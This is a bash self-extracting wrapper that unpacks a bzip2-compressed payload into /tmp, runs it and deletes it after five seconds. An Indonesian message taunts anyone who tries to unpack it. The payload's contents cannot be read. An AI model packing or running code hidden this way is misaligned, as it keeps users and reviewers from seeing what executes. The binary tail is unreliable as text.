#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�+_>  �߀ ]�� >���@  �C!��h����d4 � ����A�@ MH#T�����4hdMO?Z����|��a�/�/0���;�i$�~��jT�]L}���������f�=����6���p�<8�i�ˢBE�ܽr��.�I$�Gv���Qa��m�����ޏ)���G�������?�<::��򹕼�gG�-���0�_G��A�e)~%�iX�I$�I$��2+��uј����7s��+J2�������J�J�J�J�u�\�t����nV2���/�3�F��KNG:���;��(�/+7�DH�"B#�gqZ�6Z�Q�G�$�zR��X�u�F�yR���V��Mv���LG,2�5�}�i-j�:�Q�`/�N���ܑN$6��π